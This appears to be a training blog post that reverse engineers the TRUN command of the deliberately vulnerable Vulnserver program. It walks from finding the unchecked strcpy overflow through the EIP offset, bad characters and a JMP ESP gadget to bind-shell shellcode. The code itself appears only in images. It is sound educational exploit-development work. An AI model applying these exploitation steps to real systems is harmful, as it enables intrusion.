# Intro
-----

At the time of writing, I am currently enrolled in Offensive Security's EXP-301/OSED course. One of the topics covered in the course is reverse engineering for bugs, which was one of my favorite modules. I wanted to get in a little extra practice so I came back to Vulnserver again, interested to see how complex it would be to reverse engineer it to discover the bugs.
<br/>

All testing was done on a Windows 10 v1910 VM with the firewall disabled, but Windows Defender enabled.

# Reverse Engineering Vulnserver with WinDbg and IDA Free
-----
## Exploring vulnserver's functionality

We'll start by sending a generic network packet to vulnserver just to observe how it handles incoming data and understand code flow. The initial PoC is simple:
<center><img src="/assets/images/trun_re/1.png" /></center>  
<center><i><small>Figure 1 - Starter PoC</small></i></center>  
<br/>

Fire up WinDbg and then attach `vulnserver.exe`. We should see a list of imported DLLs right at the start, which has some valuable information for our first step in reverse engineering:
<center><img src="/assets/images/trun_re/2.png" /></center>  
<center><i><small>Figure 2 - Imported DLLs</small></i></center>  
<br/>

We start by seting a breakpoint at the `recv` function inside of `ws2_32.dll`. This is because `ws2_32.dll` is the library that vulnserver is using for network activity.
<center><img src="/assets/images/trun_re/3.png" /></center>  
<center><i><small>Figure 3 - Setting a breakpoint</small></i></center>  
<br/>

Execute the PoC, and observe how the breakpoint is hit in WinDbg:
<center><img src="/assets/images/trun_re/4.png" /></center>  
<center><i><small>Figure 4 - Breakpoint is hit</small></i></center>  
<br/>

We aren't really interested in stepping through this function, so use the `pt` command in WinDbg, which will continue execution until a `RET` instruction is encountered. Then use `p` to step a single instruction, and observe the address we land on:
<center><img src="/assets/images/trun_re/5.png" /></center>  
<center><i><small>Figure 5 - Returning to the func that called recv</small></i></center>  
<br/>

Now we open IDA Free and load up vulnserver. Once it is finished with analysis, press the `g` key to bring up a search box, and type the address displayed by WinDbg:
<center><img src="/assets/images/trun_re/6.png" /></center>  
<center><i><small>Figure 6 - The code that calls recv</small></i></center>  
<br/>

The instructions following the call to `recv` will perform the following actions:  
* Move the contents of `EAX` onto the stack
* Compare this value to `0`
* Make a jump if this value is *less than or equal to* `0`

Let's see what is in `EAX`:
<center><img src="/assets/images/trun_re/7.png" /></center>  
<center><i><small>Figure 7 - Value of EAX</small></i></center>  
<br/>

The value is 0xFFFFFFFF, which represents a `-1`, which means that the jump should be taken. We'll confirm this in WinDbg:
<center><img src="/assets/images/trun_re/8.png" /></center>  
<center><i><small>Figure 8 - "br=1" means the jump is taken</small></i></center>  
<br/>

We come to the next code block in IDA which tries to compare the mystery value on the stack to `0` once again, causing execution to branch again. Following this second branch in IDA, we find this troubling code:
<center><img src="/assets/images/trun_re/9.png" /></center>  
<center><i><small>Figure 9 - Error handling code</small></i></center>  
<br/>

Looks like a socket error occurred. Following execution beyond here just leads us to a loop that redirects execution back to the `recv` call, waiting for more incoming user input.

## Understanding how vulnserver parses commands

We'll go back to the code block in IDA where we saw the call to `recv` and trace where code exection would go if we *didn't* have a socket error:
<center><img src="/assets/images/trun_re/10.png" /></center>  
<center><i><small>Figure 10 - Looking for content in the buffer</small></i></center>  
<br/>

The code in this block is setting up a few arguments before calling `strncmp`.
* Moving the value `5` on the stack
* Moving the offset to the ascii string "HELP " on the stack
* Moving an unknown value into `EAX`, and then moving it onto the stack

`strncmp` takes 3 arguments; two strings to compare, and the number of bytes to compare. This code is going to see if the mystery value is the same as "HELP " with a trailing space. After the call completes, the code tests to see if `EAX` is equal to itself, and if it is not, execution continues to more code blocks doing similar comparisons:
<center><img src="/assets/images/trun_re/16.png" /></center>  
<center><i><small>Figure 11 - Another string check</small></i></center>  
<br/>

We'll re-run the PoC with the breakpoint to `recv` still set, and after it returns, we'll manually set `EAX` to a value that is greater than 0 to manipulate code flow:
<center><img src="/assets/images/trun_re/11.png" /></center>  
<center><i><small>Figure 12 - Chaning the value of EAX</small></i></center>  
<br/>

Keep stepping through the code in WinDbg until we reach the call to `strncmp`, and then dump the stack to see the arguments:
<center><img src="/assets/images/trun_re/13.png" /></center>  
<center><i><small>Figure 13 - Args to strncmp</small></i></center>  
<br/>

The first argument is supposed to be our supplied buffer, but since we're still having unexplained socket errors, no buffer was received. This would cause the `strncmp` to return a non-zero value since the strings don't match, starting the flow of additional comparisons.

In C or C++, this would likely be a nested "if/else" statement comparing user-supplied input to several strings to look for a match.

With our new knowledge, we'll change up our PoC to add "HELP " to the start of the buffer to trigger a successful comparison. It was also at this point that I suspected that having a breakpoint on `recv` may be causing socket errors for an unknown reason, so I cleared all breakpoints with `bc *`, and the set a breakpoint on the call to `strncmp` instead:
<center><img src="/assets/images/trun_re/18.png" /></center>  
<center><i><small>Figure 14 - Updated buffer</small></i></center>  
<br/>

Landing on this call, we'll dump the stack again to see what the arguments are this time:
<center><img src="/assets/images/trun_re/21.png" /></center>  
<center><i><small>Figure 15 - Args to strncmp take 2</small></i></center>  
<br/>

We can see now that the first 5 bytes of our buffer are being checked to see if they match "HELP ". The comparison should return `0` to denote that the two strings are equal, so code will *not* branch and instead continue normally. Follow the `red arrow` on the code block and we should see this:
<center><img src="/assets/images/trun_re/23.png" /></center>  
<center><i><small>Figure 16 - Executing the received command</small></i></center>  
<br/>

Looks like some different code is being executed based on the received command. We see some arguments being prepared before a call to `send`, most notable of which is a long string. It appears that this is going to send us a message back based on our input. If we want to confirm this theory we can modify our PoC like so:
<center><img src="https://i.imgur.com/aFNanbW.png" /></center>  
<center><i><small>Figure 17 - Receiving output</small></i></center>  
<br/>

We need two `s.recv` calls due to the fact that vulnserver prints out a line of text upon connection. We don't print it because we don't care about it. The second `s.recv` will be put into a variable and then printed:
<center><img src="/assets/images/trun_re/24.png" /></center>  
<center><i><small>Figure 18 - Confirming returned output</small></i></center>  
<br/>

## Reverse Engineering TRUN

Since we will be sending the "TRUN" command during this exercise, we'll just follow the branching comparisons in IDA until we see it:
<center><img src="/assets/images/trun_re/25.png" /></center>  
<center><i><small>Figure 19 - The TRUN command in IDA</small></i></center>  
<br/>

Here we see that if the "TRUN " command is received, code will flow naturally to a couple of calls to `malloc` and `memset`. `malloc` will be allocating new memory, and `memset` will be copying data into that new memory, most likely the buffer we send.

Another change is made to our PoC to replace "HELP " with "TRUN ", and remove both instances of the `s.recv` since they aren't needed anymore.  
Let's put a breakpoint on the `memset` command and then dump the stack:
<center><img src="/assets/images/trun_re/27.png" /></center>  
<center><i><small>Figure 20 - Args to memset</small></i></center>  
<br/>

`memset` takes the following three arguments:
* A pointer to the memory to fill
* A pointer to the buffer to copy
* The number of bytes to set

Based on what we see here, the first address is where the buffer will land, the second argument is currently NULL, and the third argument is decimal 3000. This means we can send a buffer up to a maximum of 3000 bytes and it will all be accepted and put in memory.

Step *over* the call to `memset` with the `p` command in WinDbg to continue. We'll follow where execution goes in IDA and we find this code block:
<center><img src="/assets/images/trun_re/28.png" /></center>  
<center><i><small>Figure 21 - Basic code block</small></i></center>  
<br/>

We have a new mystery value being moved into `EAX` and then being compared to another mystery value. To determine what these values really are, we step to the `CMP` instruction and then observe these values:
<center><img src="/assets/images/trun_re/30.png" /></center>  
<center><i><small>Figure 22 - Comparing 0x5 to 0x1000</small></i></center>  
<br/>

The code will check to see if the destination operand (0x5) is greater than the source operand (0x1000), and if it is, a jump will be taken. 5 is less than 1000 obviously, so the jump is *not* taken:
<center><img src="/assets/images/trun_re/31.png" /></center>  
<center><i><small>Figure 23 - Execution does not branch</small></i></center>  
<br/>

We follow the red arrow again in IDA and arrive here:
<center><img src="/assets/images/trun_re/32.png" /></center>  
<center><i><small>Figure 24 - Another string comparison</small></i></center>  
<br/>

Here we have another value being moved into `EAX`, then having another value added to it, and then a comparison to see if that byte is equal to 0x2E, which is ascii `.`.  
As we step through the instructions we see that the value being added is 5. If we check the other value, we find that it's our buffer:
<center><img src="/assets/images/trun_re/38.png" /></center>  
<center><i><small>Figure 25 - Our buffer in memory</small></i></center>  
<br/>

So what appears to be happening here is that a pointer to our buffer is put into EAX and then 5 is added to it to move past the "TRUN " and then checks to see if the next character is a `.`. Since it's not we end up inside of a loop that keeps incrementing the number added to this comparison, so it seems that we've reached code that will "scan" the first 0x1000 bytes of our buffer for the `.` character.

## Making sure TRUN accepts our buffer and processes it

Now we have new information to implement into our PoC. Let's add a `.` after "TRUN ", set a breakpoint at the instruction that compares our buffer to 0x2E, and run it:
<center><img src="/assets/images/trun_re/42.png" /></center>  
<center><i><small>Figure 26 - Updated PoC</small></i></center>  
<br/>
<center><img src="/assets/images/trun_re/43.png" /></center>  
<center><i><small>Figure 27 - Successful comparison</small></i></center>  
<br/>

When we step *over* the comparison, WinDbg tells us that execution will not branch:
<center><img src="/assets/images/trun_re/45.png" /></center>  
<center><i><small>Figure 28 - Execution continues normally</small></i></center>  
<br/>

Once again, trace this code flow by following the red arrow in IDA to see what comes next:
<center><img src="/assets/images/trun_re/46.png" /></center>  
<center><i><small>Figure 29 - The next code block</small></i></center>  
<br/>

We have a few things going on here. First, there are some arguments being prepared before a call to `strncpy`, and then a call to an unknown function.  
Switching back to WinDbg, we can step until we reach the `strncpy` call and then dump the stack again:
<center><img src="/assets/images/trun_re/47.png" /></center>  
<center><i><small>Figure 30 - Args to strncpy</small></i></center>  
<br/>

`strncpy` takes three arguments:
* Pointer to the destination array
* Pointer to the source string
* The number of characters to copy

Based on this information and the stack dump above, we know that the first argument is an area in memory to copy to, the second argument is our buffer, and the third argument is 3000. Simply put, our buffer is being copied into a new memory location.

## Locating the memory corruption bug

We have no idea what `_Function3` is, so let's double-click it in IDA to jump to it and analyze it:
<center><img src="/assets/images/trun_re/48.png" /></center>  
<center><i><small>Figure 31 - Mystery function</small></i></center>  
<br/>

Right away, I realized that this was the memory corruption bug. Notice the call to `strcpy`.  
Recall that `strncpy` took three arguments, with the third argument being a hard-coded number of bytes to copy.  
`strcpy` only takes two arguments, the destination buffer and the source buffer. It does not accept a number of bytes to copy. Rather, `strcpy` will just continue to read and copy the buffer until it encounters a null byte (\x00).

At this point we will use the `t` command in WinDbg to step *into* the call to `_Function3` so we can analyze it. We step to the call to `strcpy` and stop, and dump the stack yet again:
<center><img src="/assets/images/trun_re/50.png" /></center>  
<center><i><small>Figure 32 - Args to strcpy</small></i></center>  
<br/>

Perhaps not surprising, our buffer is being copied into a new region of memory once again. Only now, we know that there is no check on how much we're providing to this function, which makes it ripe for abuse.

Out of curiosity, we can see where this will return to by pressing the back button in IDA and following execution:
<center><img src="/assets/images/trun_re/51.png" /></center>  
<center><i><small>Figure 33 - TRUN's graceful exit</small></i></center>  
<br/>

Under normal circumstances, execution would just flow to this code block which prints a message out to our connected terminal. If the execution flow is followed further in IDA, you'll discover that it just loops back to the `recv` function, ready to receive a new command again.

## Determining the offset
Traditionally, people use the `pattern_create` script in Metasploit to create a cyclical pattern to find the exact offset to overwrite EIP. But, we don't need to do that here. If we continue our reverse engineering, we can figure out the exact offset without any other tools.

Put a breakpoint on the `strcpy` inside of `_Function3` and then look at the first argument. We can check to see if this address is within the stack range:
<center><img src="/assets/images/trun_re/52.png" /></center>  
<center><i><small>Figure 34 - Checking the destination buffer</small></i></center>  
<br/>

The value is within the limits of the stack, which means that our buffer is definitely copied onto the stack, meaning that we can overwrite other structures on the stack if too much data is sent. But exactly how much do we need?

We can check a few structures in WinDbg and compare it to our destination buffer, do a little math, and get the answer.  
First, bring up the "call stack" using the `k` command in WinDbg. This will show us a list of function calls that have been made.  
Then, we can dump the return address of the most recent function call.  
Finally, we take the return address and subtract the address of the `strcpy` destination buffer:
<center><img src="https://i.imgur.com/ASFn3qL.png" /></center>  
<center><i><small>Figure 35 - Determining the offset</small></i></center>  
<br/>

`2012` is the magic number. Let's test that!  
Update the PoC to send 2012 A's, set a breakpoint at the `strcpy`, and then execute the script. For fun, let's check the call stack before and after the call:
<center><img src="/assets/images/trun_re/53.png" /></center>  
<center><i><small>Figure 36 - Updated PoC</small></i></center>  
<br/>
<center><img src="/assets/images/trun_re/54.png" /></center>  
<center><i><small>Figure 37 - Overwritten return address</small></i></center>  
<br/>

It looks like a return address was overwritten. We can always test this by stepping a couple more instructions until this happens:
<center><img src="/assets/images/trun_re/55.png" /></center>  
<center><i><small>Figure 38 - EIP was overwritten with 41414141</small></i></center>  
<br/>

Let's see if this is the exact overwrite:
<center><img src="/assets/images/trun_re/56.png" /></center>  
<center><i><small>Figure 39 - Updated PoC</small></i></center>  
<br/>

<center><img src="/assets/images/trun_re/57.png" /></center>  
<center><i><small>Figure 40 - Inaccurate overwrite?</small></i></center>  
<br/>

After thinking about it a little bit, I figured out why I got this overwrite.  
We need 2012 bytes to overwrite EIP, but "TRUN ." is already 6 bytes. Also, I realized that 2012 is the offset to *reach* the return address, so to overwrite it, we need another four. So let's change the PoC again:
<center><img src="/assets/images/trun_re/58.png" /></center>  
<center><i><small>Figure 41 - Updated PoC</small></i></center>  
<br/>
<center><img src="/assets/images/trun_re/59.png" /></center>  
<center><i><small>Figure 42 - Perfect overwrite</small></i></center>  
<br/>

The theory holds water. We've verified an accurate, reliable EIP overwrite without using patterns.  
Let's quickly address bad characters. We've traced the TRUN funtion from start to finish and we saw no evidence that there is any type of filtering of our buffer, or any functions that will interpret certain values as commands. The only check we saw was looking for a `.` character which is necessary to make it process the buffer. We also know that `strcpy` is terminated by null bytes. That means that we should feel confident that 0x00 is the only bad character. Another annoying step simplified through reverse engineering!

One last quick step before moving on. We just want to make sure that any data that comes *after* the overwrite will land in the stack in a place that we can reach it, so we can always just add some dummy shellcode, run the PoC without breakpoints (it will halt on access violation exception), and then dump the stack:
<center><img src="/assets/images/trun_re/60.png" /></center>  
<center><i><small>Figure 43 - Updated PoC</small></i></center>  
<br/>

<center><img src="/assets/images/trun_re/61.png" /></center>  
<center><i><small>Figure 44 - Dummy shellcode pointed to by ESP</small></i></center>  
<br/>

## Finding a JMP ESP

Time to find a `JMP ESP` instruction. We can't use vulnserver itself because all of its addresses begin with a null byte. Let's look at the address range of the `essfunc.dll` that comes with vulnserver with the `lm` command.
<center><img src="/assets/images/trun_re/62.png" /></center>  
<center><i><small>Figure 45 - Looking for a valid module</small></i></center>  
<br/>

Now we just have to validate that this DLL has no protections on it. The easiest way is to install a WinDbg plugin named Narly[^narly] to make this check. We load it with `.load narly` in WinDbg, and then invoke it's solitary command, `!nmod`:
<center><img src="/assets/images/trun_re/63.png" /></center>  
<center><i><small>Figure 46 - No ASLR or DEP for essfunc.dll</small></i></center>  
<br/>

We're nearly there. Let's refresh our memory on the opcodes for `JMP ESP`:
<center><img src="/assets/images/trun_re/64.png" /></center>  
<center><i><small>Figure 47 - JMP ESP opcodes</small></i></center>  
<br/>

Now, in order to search for these opcodes, we'll have to grab the address range of essfunc.dll, and use that as part of our search:
<center><img src="/assets/images/trun_re/65.png" /></center>  
<center><i><small>Figure 48 - Finding and validating JMP ESP</small></i></center>  
<br/>

Using `lm m essfunc` we get more details on essfunc.dll. Then we search that specific range for `0xff` and `0xe4`. We get a lot of results. To verify the results, we can use the `u` command followed by an address of our choice to unassemble the instructions at that address.

## Getting code execution

Home stretch! We'll update our PoC with the `JMP ESP` address, and then set a breakpoint on it, run the PoC, and then re-verify that the dummy shellcode has been successfully jumped to:
<center><img src="/assets/images/trun_re/66.png" /></center>  
<center><i><small>Figure 49 - Updated PoC</small></i></center>  
<br/>
<center><img src="/assets/images/trun_re/67.png" /></center>  
<center><i><small>Figure 50 - Successfully hit the JMP ESP</small></i></center>  
<br/>
<center><img src="/assets/images/trun_re/68.png" /></center>  
<center><i><small>Figure 51 - Landed in dummy shellcode</small></i></center>  
<br/>

I'll be generating bind shellcode in my example because I did this exercise from my Windows host using WSL2 to run a Kali instance, and I haven't researched how to port forward to WSL2 which makes reverse shells unconventional for my setup. Feel free to use whatever payload suits your situation.
<center><img src="/assets/images/trun_re/69.png" /></center>  
<center><i><small>Figure 52 - Generating a bind shell</small></i></center>  
<br/>

The code is added to the PoC, with a NOP sled prepended to it:
<center><img src="/assets/images/trun_re/70.png" /></center>  
<center><i><small>Figure 53 - Shellcoded added to PoC</small></i></center>  
<br/>

I closed out WinDbg entirely and ran vulnserver one last time, and then ran my script. After the script ran, I checked to see if it worked by opening an *elevated* CMD prompt on the victim and ran `netstat -anbp tcp`:
<center><img src="/assets/images/trun_re/71.png" /></center>  
<center><i><small>Figure 54 - Successfully opened a new port</small></i></center>  
<br/>

Finally, a connection is established with netcat:

<br/>

# Conclusion
---
Reverse engineering can be difficult, and quite tedious and time-consuming, but it is much more powerful than fuzzing, and tons of information can be revealed about the inner workings of an application. I personally find it to be fun and enjoyable and I really liked going through this exercise. Expect more posts like these in the future as I reverse engineer other vulnserver commands!
